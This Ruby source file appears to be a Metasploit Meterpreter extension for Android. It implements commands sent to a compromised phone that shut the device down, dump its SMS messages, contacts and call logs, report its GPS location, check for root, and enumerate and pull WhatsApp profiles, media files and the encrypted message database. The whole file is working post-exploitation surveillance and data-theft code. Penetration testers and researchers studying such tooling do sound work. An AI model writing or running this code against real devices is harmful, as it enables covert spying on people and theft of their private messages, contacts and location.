#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/android/tlv'
require 'rex/post/meterpreter/packet'
require 'rex/post/meterpreter/client'
require 'rex/post/meterpreter/channels/pools/stream_pool'


module Rex
module Post
module Meterpreter
module Extensions
module Android

###
# Android extension - set of commands to be executed on android devices.
# extension by Anwar Mohamed (@anwarelmakrahy)
###

  
class Android < Extension

  def initialize(client)
    super(client, 'android')

    # Alias the following things on the client object so that they
    # can be directly referenced
    client.register_extension_aliases(
      [
        {
          'name' => 'android',
          'ext'  => self
        },
      ])
  end
  
  def device_shutdown(n)
    request = Packet.create_request('device_shutdown')
    request.add_tlv(TLV_TYPE_SHUTDOWN_TIMER, n)
    response = client.send_request(request)
    return response.get_tlv(TLV_TYPE_SHUTDOWN_OK).value
  end 
  
  def dump_sms
    sms = Array.new
    request = Packet.create_request('dump_sms')
    response = client.send_request(request)

    response.each( TLV_TYPE_SMS_GROUP ) { |p|

      sms <<
      {
        'type'    => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_TYPE).value),
        'address' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_ADDRESS).value),
        'body'    => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_BODY).value).squish,
        'status'  => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_STATUS).value),
        'date'    => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_DATE).value)
      }

    }
    return sms
  end

  def dump_contacts
    contacts = Array.new
    request = Packet.create_request('dump_contacts')
    response = client.send_request(request)

    response.each( TLV_TYPE_CONTACT_GROUP ) { |p|

      contacts <<
      {
        'name'   => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CONTACT_NAME).value),
        'email'  => client.unicode_filter_encode(p.get_tlv_values(TLV_TYPE_CONTACT_EMAIL)),
        'number' => client.unicode_filter_encode(p.get_tlv_values(TLV_TYPE_CONTACT_NUMBER))
      }

    }
    return contacts
  end

  def geolocate

    loc = Array.new
    request = Packet.create_request('geolocate')
    response = client.send_request(request)

    loc <<
    {
      'lat' => "#{client.unicode_filter_encode(response.get_tlv(TLV_TYPE_GEO_LAT).value)}",
      'long' => "#{client.unicode_filter_encode(response.get_tlv(TLV_TYPE_GEO_LONG).value)}"
    }

    return loc
  end

  def dump_calllog
    log = Array.new
    request = Packet.create_request('dump_calllog')
    response = client.send_request(request)

    response.each(TLV_TYPE_CALLLOG_GROUP) { |p|

      log <<
      {
        'name'     => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_NAME).value),
        'number'   => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_NUMBER).value),
        'date'     => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_DATE).value),
        'duration' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_DURATION).value),
        'type'     => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_TYPE).value)
      }

    }
    return log
  end

  def check_root
    request = Packet.create_request('check_root')
    response = client.send_request(request)
    is_rooted = response.get_tlv(TLV_TYPE_CHECK_ROOT_BOOL).value
    return is_rooted
  end
  


  def dump_whatsapp_enum
    store = Hash.new
    request = Packet.create_request('dump_whatsapp')
    request.add_tlv(TLV_TYPE_WHATSAPP_REQUEST, 'enumerate_all')
    response = client.send_request(request)

    store =
    {
      'msgstore' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_MSG).to_s),
      'profile'  => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_PP).to_s),
      'image'    => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_IMG).to_s),
      'video'    => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_VID).to_s),
      'audio'    => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_AUD).to_s),
      'voice'    => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_VOI).to_s)
    }
    return store
  end

  def dump_whatsapp_enum_pp
    store = Array.new
    request = Packet.create_request('dump_whatsapp')
    request.add_tlv(TLV_TYPE_WHATSAPP_REQUEST, 'enumerate_profiles')
    response = client.send_request(request)

    response.each(TLV_TYPE_WHATSAPP_STRING) { |p|
      store << client.unicode_filter_encode(p.value)
    }
    return store
  end

  def dump_whatsapp_enum_media
    store = Array.new
    request = Packet.create_request('dump_whatsapp')
    request.add_tlv(TLV_TYPE_WHATSAPP_REQUEST, 'enumerate_media')
    response = client.send_request(request)

    response.each(TLV_TYPE_WHATSAPP_GROUP) { |p|
      media = Hash.new
      media['type'] = client.unicode_filter_encode(p.get_tlv_value(TLV_TYPE_WHATSAPP_STRING))

      media['array'] = Array.new
      p.each(TLV_TYPE_WHATSAPP_GROUP) { |q|
        q.each(TLV_TYPE_WHATSAPP_STRING) { |r|
          media['array'] << client.unicode_filter_encode(r.value)
        }   
      }
      store << media
    }
    return store
  end

  def dump_whatsapp_get_media(type, index)
    request = Packet.create_request('dump_whatsapp')
    request.add_tlv(TLV_TYPE_WHATSAPP_REQUEST, 'get_' + type)

    case type
    when "profile"
      type = TLV_TYPE_WHATSAPP_ENUM_PP
    when "image"
      type = TLV_TYPE_WHATSAPP_ENUM_IMG
    when "video"
      type = TLV_TYPE_WHATSAPP_ENUM_VID
    when "voice"
      type = TLV_TYPE_WHATSAPP_ENUM_VOI
    when "audio"
      type = TLV_TYPE_WHATSAPP_ENUM_AUD
    else
      return
    end

    request.add_tlv(type, index)
    response = client.send_request(request)
    media_hash =
    {
      'filename' => client.unicode_filter_encode(response.get_tlv(TLV_TYPE_WHATSAPP_STRING).value),
      'raw'      => response.get_tlv(TLV_TYPE_WHATSAPP_RAW).value
    }
    return media_hash
  end

  def dump_whatsapp
    dbstore = Hash.new
    request = Packet.create_request('dump_whatsapp')
    request.add_tlv(TLV_TYPE_WHATSAPP_REQUEST, 'dump_msgstore')
    response = client.send_request(request)
    hash =
    {
      'metadata' => client.unicode_filter_encode(response.get_tlv(TLV_TYPE_WHATSAPP_STRING).value),
      'raw'      => response.get_tlv(TLV_TYPE_WHATSAPP_ENCRYPTED).value
    }
    return hash
  end

end

end; end; end; end; end